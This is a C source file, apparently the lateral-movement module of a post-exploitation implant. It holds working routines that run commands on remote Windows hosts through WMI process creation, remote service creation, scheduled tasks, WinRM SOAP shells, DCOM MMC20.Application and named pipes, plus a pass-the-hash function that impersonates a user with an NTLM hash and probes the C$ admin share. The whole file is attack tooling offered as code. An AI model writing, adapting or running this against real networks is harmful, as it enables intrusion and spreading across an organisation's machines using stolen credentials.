/**
 * lateral.c - Lateral Movement Module
 *
 * Implements various techniques for moving between systems:
 * - WMI process creation
 * - Service Control Manager (SCM)
 * - Scheduled tasks (schtasks)
 * - WinRM
 * - DCOM
 * - PsExec-style service deployment
 */

#include <windows.h>
#include <wbemidl.h>
#include <lm.h>
#include <sddl.h>
#include <winhttp.h>
#include <stdio.h>
#include "../../include/postex.h"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")

/* ---- WMI Execution ---- */
int lateral_wmi_exec(const char* target, const char* command,
                     const char* username, const char* password,
                     char* output, int output_sz) {
    HRESULT hr;
    IWbemLocator* locator = NULL;
    IWbemServices* services = NULL;
    IWbemClassObject* process_class = NULL;
    IWbemClassObject* in_params = NULL;
    IWbemClassObject* out_params = NULL;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return -1;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void**)&locator);
    if (FAILED(hr)) goto cleanup;

    // Build WMI path: \\TARGET\root\cimv2
    wchar_t wmi_path[512];
    swprintf(wmi_path, 512, L"\\\\%hs\\root\\cimv2", target);

    BSTR bstr_path = SysAllocString(wmi_path);

    // Set authentication if credentials provided
    BSTR bstr_user = NULL;
    BSTR bstr_pass = NULL;
    if (username && password) {
        wchar_t wuser[256], wpass[256];
        MultiByteToWideChar(CP_ACP, 0, username, -1, wuser, 256);
        MultiByteToWideChar(CP_ACP, 0, password, -1, wpass, 256);

        bstr_user = SysAllocString(wuser);
        bstr_pass = SysAllocString(wpass);
        hr = locator->lpVtbl->ConnectServer(locator, bstr_path,
            bstr_user, bstr_pass, NULL, 0, NULL, NULL, &services);
    } else {
        hr = locator->lpVtbl->ConnectServer(locator, bstr_path,
            NULL, NULL, NULL, 0, NULL, NULL, &services);
    }
    if (bstr_user) SysFreeString(bstr_user);
    if (bstr_pass) SysFreeString(bstr_pass);

    SysFreeString(bstr_path);
    if (FAILED(hr)) goto cleanup;

    // Set security on the proxy
    hr = CoSetProxyBlanket((IUnknown*)services, RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) goto cleanup;

    // Get Win32_Process class
    BSTR class_name = SysAllocString(L"Win32_Process");
    hr = services->lpVtbl->GetObject(services, class_name, 0, NULL,
                                      &process_class, NULL);
    SysFreeString(class_name);
    if (FAILED(hr)) goto cleanup;

    // Get Create method
    BSTR method_name = SysAllocString(L"Create");
    hr = process_class->lpVtbl->GetMethod(process_class, method_name, 0,
                                           &in_params, NULL);
    if (FAILED(hr)) goto cleanup;

    // Set CommandLine parameter
    IWbemClassObject* spawn_params = NULL;
    hr = in_params->lpVtbl->SpawnInstance(in_params, 0, &spawn_params);
    if (FAILED(hr)) goto cleanup;

    wchar_t wcmd[2048];
    MultiByteToWideChar(CP_ACP, 0, command, -1, wcmd, 2048);
    VARIANT var_cmd;
    VariantInit(&var_cmd);
    var_cmd.vt = VT_BSTR;
    var_cmd.bstrVal = SysAllocString(wcmd);
    hr = spawn_params->lpVtbl->Put(spawn_params, L"CommandLine", 0, &var_cmd, 0);
    VariantClear(&var_cmd);

    // Execute
    BSTR class_name_exec = SysAllocString(L"Win32_Process");
    hr = services->lpVtbl->ExecMethod(services,
        class_name_exec, method_name, 0, NULL, spawn_params, &out_params, NULL);
    SysFreeString(class_name_exec);
    SysFreeString(method_name);

    if (SUCCEEDED(hr) && out_params) {
        VARIANT var_ret;
        VariantInit(&var_ret);
        hr = out_params->lpVtbl->Get(out_params, L"ReturnValue", 0, &var_ret, NULL, NULL);
        if (SUCCEEDED(hr)) {
            snprintf(output, output_sz, "WMI Create returned: %d", var_ret.intVal);
            VariantClear(&var_ret);
        }
    }

cleanup:
    if (out_params) out_params->lpVtbl->Release(out_params);
    if (in_params) in_params->lpVtbl->Release(in_params);
    if (process_class) process_class->lpVtbl->Release(process_class);
    if (services) services->lpVtbl->Release(services);
    if (locator) locator->lpVtbl->Release(locator);
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : -1;
}

/* ---- SCM Service Deployment ---- */
int lateral_scm_exec(const char* target, const char* service_name,
                     const char* bin_path, char* output, int output_sz) {
    SC_HANDLE sc_mgr = NULL;
    SC_HANDLE svc = NULL;
    int result = -1;

    // Connect to remote SCM
    wchar_t wtarget[256];
    MultiByteToWideChar(CP_ACP, 0, target, -1, wtarget, 256);

    sc_mgr = OpenSCManagerW(wtarget, NULL, SC_MANAGER_ALL_ACCESS);
    if (!sc_mgr) {
        snprintf(output, output_sz, "OpenSCManager failed: %lu", GetLastError());
        return -1;
    }

    wchar_t wsvc_name[256], wbin_path[512];
    MultiByteToWideChar(CP_ACP, 0, service_name, -1, wsvc_name, 256);

    char svc_bin[768];
    if (_strnicmp(bin_path, "cmd.exe", 7) != 0 &&
        _strnicmp(bin_path, "C:\\Windows\\System32\\cmd.exe", 27) != 0) {
        _snprintf(svc_bin, sizeof(svc_bin), "cmd.exe /c \"%s\"", bin_path);
    } else {
        lstrcpynA(svc_bin, bin_path, sizeof(svc_bin));
    }
    MultiByteToWideChar(CP_ACP, 0, svc_bin, -1, wbin_path, 512);

    // Create service
    svc = CreateServiceW(sc_mgr, wsvc_name, wsvc_name,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        wbin_path, NULL, NULL, NULL, NULL, NULL);

    if (!svc) {
        // Try opening existing service
        svc = OpenServiceW(sc_mgr, wsvc_name, SERVICE_ALL_ACCESS);
        if (!svc) {
            snprintf(output, output_sz, "CreateService/OpenService failed: %lu", GetLastError());
            goto done;
        }
    }

    // Start the service
    if (StartServiceW(svc, 0, NULL)) {
        snprintf(output, output_sz, "Service '%s' started on %s", service_name, target);
        result = 0;
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            snprintf(output, output_sz, "Service already running on %s", target);
            result = 0;
        } else {
            snprintf(output, output_sz, "StartService failed: %lu", err);
        }
    }

    // Cleanup: stop and delete service
    SERVICE_STATUS status;
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    DeleteService(svc);

done:
    if (svc) CloseServiceHandle(svc);
    if (sc_mgr) CloseServiceHandle(sc_mgr);
    return result;
}

/* ---- Scheduled Task Execution ---- */
int lateral_schtask_exec(const char* target, const char* command,
                         const char* task_name, char* output, int output_sz) {
    char cmd_buf[4096];

    // Build schtasks command
    snprintf(cmd_buf, sizeof(cmd_buf),
        "schtasks /create /s %s /tn \"%s\" /tr \"%s\" /sc once /st 00:00 /f && "
        "schtasks /run /s %s /tn \"%s\" && "
        "schtasks /delete /s %s /tn \"%s\" /f",
        target, task_name, command,
        target, task_name,
        target, task_name);

    // Execute via cmd.exe
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char exec_cmd[4200];
    snprintf(exec_cmd, sizeof(exec_cmd), "cmd.exe /c %s", cmd_buf);

    if (CreateProcessA(NULL, exec_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        DWORD exit_code;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        snprintf(output, output_sz, "Schtask execution completed (exit: %lu)", exit_code);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return exit_code == 0 ? 0 : -1;
    }

    snprintf(output, output_sz, "CreateProcess failed: %lu", GetLastError());
    return -1;
}

/* ---- Pass-the-Hash via LOGON32_LOGON_NEW_CREDENTIALS ----
 *
 * Uses LogonUserA with LOGON32_LOGON_NEW_CREDENTIALS (type 9) which accepts
 * an NTLM hash as the password. The resulting token can access remote
 * resources as the specified user without needing their cleartext password.
 *
 * Flow:
 *   1. LogonUser with NEW_CREDENTIALS + the NT hash as "password"
 *   2. ImpersonateLoggedOnUser to adopt the token
 *   3. Connect to target\\C$ (or desired share) to verify access
 *   4. Optionally execute via SCM/WMI under the impersonated context
 */
int lateral_pth(const char* target, const char* domain, const char* username,
                const char* ntlm_hash, char* output, int output_sz) {
    if (!target || !username || !ntlm_hash) {
        snprintf(output, output_sz, "pth: target, username, and ntlm_hash required");
        return -1;
    }

    HANDLE hToken = NULL;
    BOOL ok = LogonUserA(
        username,
        domain ? domain : ".",
        ntlm_hash,
        9,  /* LOGON32_LOGON_NEW_CREDENTIALS */
        0,  /* LOGON32_PROVIDER_DEFAULT */
        &hToken
    );

    if (!ok || !hToken) {
        snprintf(output, output_sz, "LogonUser failed for %s\\%s: error %lu",
                 domain ? domain : ".", username, GetLastError());
        return -1;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        snprintf(output, output_sz, "ImpersonateLoggedOnUser failed: %lu", GetLastError());
        CloseHandle(hToken);
        return -1;
    }

    char unc_path[512];
    snprintf(unc_path, sizeof(unc_path), "\\\\%s\\C$", target);

    WIN32_FIND_DATAA fd;
    char search[560];
    snprintf(search, sizeof(search), "%s\\*", unc_path);
    HANDLE hFind = FindFirstFileA(search, &fd);

    if (hFind == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        RevertToSelf();
        CloseHandle(hToken);
        snprintf(output, output_sz,
                 "PTH token created but C$ access to %s failed: error %lu",
                 target, err);
        return -1;
    }
    FindClose(hFind);

    snprintf(output, output_sz,
             "PTH success: impersonating %s\\%s with access to %s (C$ verified)",
             domain ? domain : ".", username, target);

    CloseHandle(hToken);
    return 0;
}

/* ---- WinRM via WinHTTP + WSMan SOAP ---- */
static BOOL winrm_http_post(const char *target, INTERNET_PORT port, const char *soap,
                            const char *username, const char *password,
                            char *resp, int resp_sz) {
    wchar_t wtarget[256], wpath[64] = L"/wsman";
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL ok = FALSE;

    if (!target || !soap || !resp || resp_sz <= 0)
        return FALSE;

    MultiByteToWideChar(CP_ACP, 0, target, -1, wtarget, 256);

    hSession = WinHttpOpen(L"JagerWinRM/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        return FALSE;

    hConnect = WinHttpConnect(hSession, wtarget, port, 0);
    if (!hConnect)
        goto done;

    hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath, NULL,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest)
        goto done;

    if (username && password && username[0] && password[0]) {
        wchar_t wuser[256], wpass[256];
        MultiByteToWideChar(CP_ACP, 0, username, -1, wuser, 256);
        MultiByteToWideChar(CP_ACP, 0, password, -1, wpass, 256);
        WinHttpSetCredentials(hRequest, WINHTTP_AUTH_TARGET_SERVER,
                              WINHTTP_AUTH_SCHEME_NTLM, wuser, wpass, NULL);
    }

    {
        const wchar_t *hdrs =
            L"Content-Type: application/soap+xml;charset=UTF-8\r\n";
        DWORD soap_len = (DWORD)lstrlenA(soap);
        if (!WinHttpSendRequest(hRequest, hdrs, (DWORD)-1L,
                                (LPVOID)soap, soap_len, soap_len, 0))
            goto done;
        if (!WinHttpReceiveResponse(hRequest, NULL))
            goto done;
    }

    {
        DWORD total = 0, rd = 0;
        while (WinHttpReadData(hRequest, resp + total, (DWORD)resp_sz - total - 1, &rd) && rd > 0) {
            total += rd;
            if (total >= (DWORD)resp_sz - 2)
                break;
        }
        resp[total] = '\0';
        ok = total > 0;
    }

done:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return ok;
}

static char *xml_find_attr(const char *xml, const char *attr_name, char *out, int out_sz) {
    char needle[128];
    char *p, *start, *end;

    if (!xml || !attr_name || !out || out_sz <= 0)
        return NULL;

    _snprintf(needle, sizeof(needle), "%s=\"", attr_name);
    p = strstr(xml, needle);
    if (!p)
        return NULL;

    start = p + lstrlenA(needle);
    end = strchr(start, '"');
    if (!end)
        return NULL;

    {
        int len = (int)(end - start);
        if (len >= out_sz)
            len = out_sz - 1;
        CopyMemory(out, start, len);
        out[len] = '\0';
    }
    return out;
}

int lateral_winrm_exec(const char *target, const char *command,
                       const char *username, const char *password,
                       char *output, int output_sz) {
    char url[256], soap_create[4096], soap_cmd[8192];
    char resp[65536], shell_id[128] = {0}, cmd_id[128] = {0};
    char cmd_escaped[2048];
    int i, j;

    if (!target || !command || !output || output_sz <= 0)
        return -1;

    _snprintf(url, sizeof(url), "http://%s:5985/wsman", target);

    _snprintf(soap_create, sizeof(soap_create),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:wsman=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">"
        "<s:Header>"
        "<wsa:To>%s</wsa:To>"
        "<wsman:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell</wsman:ResourceURI>"
        "<wsa:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</wsa:Action>"
        "</s:Header>"
        "<s:Body>"
        "<rsp:Shell xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<rsp:InputStreams>stdin</rsp:InputStreams>"
        "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>"
        "</rsp:Shell>"
        "</s:Body>"
        "</s:Envelope>", url);

    if (!winrm_http_post(target, 5985, soap_create, username, password, resp, sizeof(resp))) {
        snprintf(output, output_sz, "WinRM shell create failed on %s", target);
        return -1;
    }

    if (!xml_find_attr(resp, "ShellId", shell_id, sizeof(shell_id))) {
        snprintf(output, output_sz, "WinRM: no ShellId in response from %s", target);
        return -1;
    }

    for (i = 0, j = 0; command[i] && j < (int)sizeof(cmd_escaped) - 6; i++) {
        if (command[i] == '&') {
            lstrcpynA(cmd_escaped + j, "&amp;", sizeof(cmd_escaped) - j);
            j += 5;
        } else if (command[i] == '<') {
            lstrcpynA(cmd_escaped + j, "&lt;", sizeof(cmd_escaped) - j);
            j += 4;
        } else if (command[i] == '>') {
            lstrcpynA(cmd_escaped + j, "&gt;", sizeof(cmd_escaped) - j);
            j += 4;
        } else {
            cmd_escaped[j++] = command[i];
        }
    }
    cmd_escaped[j] = '\0';

    _snprintf(soap_cmd, sizeof(soap_cmd),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:wsman=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
        "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<s:Header>"
        "<wsa:To>%s</wsa:To>"
        "<wsman:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell</wsman:ResourceURI>"
        "<wsa:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</wsa:Action>"
        "<wsman:SelectorSet>"
        "<wsman:Selector Name=\"ShellId\">%s</wsman:Selector>"
        "</wsman:SelectorSet>"
        "</s:Header>"
        "<s:Body>"
        "<rsp:CommandLine>"
        "<rsp:Command>%s</rsp:Command>"
        "</rsp:CommandLine>"
        "</s:Body>"
        "</s:Envelope>", url, shell_id, cmd_escaped);

    if (!winrm_http_post(target, 5985, soap_cmd, username, password, resp, sizeof(resp))) {
        snprintf(output, output_sz, "WinRM command failed on %s (shell %s)", target, shell_id);
        return -1;
    }

    xml_find_attr(resp, "CommandId", cmd_id, sizeof(cmd_id));
    snprintf(output, output_sz, "WinRM executed on %s (shell=%s cmd=%s)",
             target, shell_id, cmd_id[0] ? cmd_id : command);
    return 0;
}

/* ---- DCOM Execution (MMC20.Application) ---- */

static HRESULT dcom_get_property(IDispatch *obj, LPCOLESTR name, VARIANT *result) {
    DISPID dispid = 0;
    LPOLESTR names = (LPOLESTR)name;
    HRESULT hr = obj->lpVtbl->GetIDsOfNames(obj, &IID_NULL, &names, 1,
                                            LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr)) return hr;

    DISPPARAMS params = {NULL, NULL, 0, 0};
    VariantInit(result);
    return obj->lpVtbl->Invoke(obj, dispid, &IID_NULL, LOCALE_USER_DEFAULT,
                                 DISPATCH_PROPERTYGET, &params, result, NULL, NULL);
}

static HRESULT dcom_invoke_method(IDispatch *obj, LPCOLESTR name,
                                  VARIANT *args, UINT argc, VARIANT *result) {
    DISPID dispid = 0;
    LPOLESTR names = (LPOLESTR)name;
    HRESULT hr = obj->lpVtbl->GetIDsOfNames(obj, &IID_NULL, &names, 1,
                                            LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr)) return hr;

    DISPPARAMS params = {args, NULL, argc, 0};
    VariantInit(result);
    return obj->lpVtbl->Invoke(obj, dispid, &IID_NULL, LOCALE_USER_DEFAULT,
                               DISPATCH_METHOD, &params, result, NULL, NULL);
}

int lateral_dcom_exec(const char* target, const char* command,
                      char* output, int output_sz) {
    HRESULT hr;
    MULTI_QI mqi = {0};
    COSERVERINFO server_info = {0};

    wchar_t wtarget[256];
    MultiByteToWideChar(CP_ACP, 0, target, -1, wtarget, 256);
    server_info.pwszName = wtarget;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return -1;

    CLSID clsid_mmc;
    hr = CLSIDFromString(L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}", &clsid_mmc);
    if (FAILED(hr)) goto done;

    mqi.pIID = &IID_IDispatch;
    hr = CoCreateInstanceEx(&clsid_mmc, NULL, CLSCTX_REMOTE_SERVER,
                            &server_info, 1, &mqi);
    if (FAILED(hr)) {
        snprintf(output, output_sz, "DCOM CoCreateInstanceEx failed: 0x%08lx", hr);
        goto done;
    }

    IDispatch *app = (IDispatch *)mqi.pItf;
    VARIANT var_doc = {0}, var_view = {0}, var_result = {0};
    static const OLECHAR *DOC = L"Document";
    static const OLECHAR *VIEW = L"ActiveView";
    static const OLECHAR *EXEC = L"ExecuteShellCommand";

    hr = dcom_get_property(app, DOC, &var_doc);
    if (FAILED(hr) || var_doc.vt != VT_DISPATCH || !var_doc.pdispVal) {
        snprintf(output, output_sz, "DCOM Document property failed: 0x%08lx", hr);
        goto release_app;
    }

    hr = dcom_get_property(var_doc.pdispVal, VIEW, &var_view);
    if (FAILED(hr) || var_view.vt != VT_DISPATCH || !var_view.pdispVal) {
        snprintf(output, output_sz, "DCOM ActiveView property failed: 0x%08lx", hr);
        goto release_doc;
    }

    wchar_t wcmd[512];
    MultiByteToWideChar(CP_ACP, 0, command, -1, wcmd, 512);

    VARIANT args[4];
    for (int i = 0; i < 4; i++) VariantInit(&args[i]);
    args[0].vt = VT_BSTR; args[0].bstrVal = SysAllocString(L"cmd.exe");
    args[1].vt = VT_BSTR; args[1].bstrVal = SysAllocString(L"C:\\Windows\\System32");
    args[2].vt = VT_BSTR; args[2].bstrVal = SysAllocString(wcmd);
    args[3].vt = VT_BSTR; args[3].bstrVal = SysAllocString(L"0");

    hr = dcom_invoke_method(var_view.pdispVal, EXEC, args, 4, &var_result);
    if (SUCCEEDED(hr))
        snprintf(output, output_sz, "DCOM ExecuteShellCommand succeeded on %s", target);
    else
        snprintf(output, output_sz, "DCOM ExecuteShellCommand failed: 0x%08lx", hr);

    for (int i = 0; i < 4; i++) VariantClear(&args[i]);
    VariantClear(&var_result);

release_doc:
    VariantClear(&var_view);
    VariantClear(&var_doc);
release_app:
    if (app) app->lpVtbl->Release(app);

done:
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : -1;
}

/* ---- Named Pipe Execution (SMB lateral) ---- */
int lateral_smb_exec(const char* target, const char* command,
                     const char* pipe_name, char* output, int output_sz) {
    char pipe_path[512];
    snprintf(pipe_path, sizeof(pipe_path), "\\\\%s\\pipe\\%s", target, pipe_name);

    wchar_t wpipe[512];
    MultiByteToWideChar(CP_ACP, 0, pipe_path, -1, wpipe, 512);

    HANDLE pipe = CreateFileW(wpipe, GENERIC_READ | GENERIC_WRITE,
                              0, NULL, OPEN_EXISTING, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE) {
        snprintf(output, output_sz, "Pipe connect failed: %lu", GetLastError());
        return -1;
    }

    // Send command over pipe
    DWORD written;
    WriteFile(pipe, command, (DWORD)strlen(command), &written, NULL);

    // Read response
    char buf[4096];
    DWORD read_bytes;
    if (ReadFile(pipe, buf, sizeof(buf) - 1, &read_bytes, NULL)) {
        buf[read_bytes] = 0;
        snprintf(output, output_sz, "%s", buf);
    }

    CloseHandle(pipe);
    return 0;
}
